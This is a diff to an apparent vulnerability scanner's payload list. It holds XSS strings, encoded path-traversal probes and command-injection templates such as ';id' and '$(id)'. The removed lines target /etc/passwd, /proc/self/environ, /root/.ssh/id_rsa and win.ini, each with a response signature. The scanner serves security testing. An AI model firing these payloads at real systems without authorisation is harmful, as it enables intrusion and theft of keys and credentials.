@@ -104,7 +104,6 @@ def all_payloads() -> list[dict]:
         "<script>alert({RANDOM})</script>",
         '"><img src=x onerror=alert({RANDOM})>',
         "'><svg onload=alert({RANDOM})>",
-        "{{constructor.constructor('alert({RANDOM})')()}}",
         "</textarea><script>alert({RANDOM})</script>",
         '" onmouseover="alert({RANDOM})"',
     ]:
@@ -151,12 +150,6 @@ def all_payloads() -> list[dict]:
         "%252e%252e%252fetc%252fpasswd",
     ]:
         payloads.append(_entry("lfi", tpl, PASSWD))
-    payloads.append(_entry("lfi", "php://filter/convert.base64-encode/resource=/etc/passwd",
-                           "cm9vdDp4Og"))
-    payloads.append(_entry("lfi", "/proc/self/environ",
-                           r"(?i)HTTP_USER_AGENT|DOCUMENT_ROOT|PATH="))
-    payloads.append(_entry("lfi", "/root/.ssh/id_rsa", r"-----BEGIN .* PRIVATE KEY-----"))
-    payloads.append(_entry("lfi", "../../../../../../../../../Windows/win.ini", WIN_INI))
 
     # -- RCE: command injection ------------------------------------------------
     for tpl in [";id", "|id", "&&id", "$(id)", "`id`", "\nid"]:
